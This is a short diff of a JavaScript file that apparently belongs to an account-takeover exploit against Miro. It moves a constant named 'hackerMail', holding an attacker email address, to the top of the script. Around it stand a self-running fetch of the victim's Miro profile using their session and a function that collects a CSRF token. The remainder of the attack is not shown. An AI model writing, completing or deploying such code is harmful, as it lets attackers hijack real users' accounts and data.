@@ -1,3 +1,5 @@
+const hackerMail = "graylen.sitiveni@malldrops.com";
+
 (() => {
 	fetch("https://miro.com/api/v1/profile/", {
 		method: "GET",
@@ -20,7 +22,6 @@
 		.catch(err => console.error("Profile fetch failed or blocked:", err));
 })();
 
-const hackerMail = "graylen.sitiveni@malldrops.com";
 
 async function getCsrf() {
   console.log("Fetching CSRF token...");
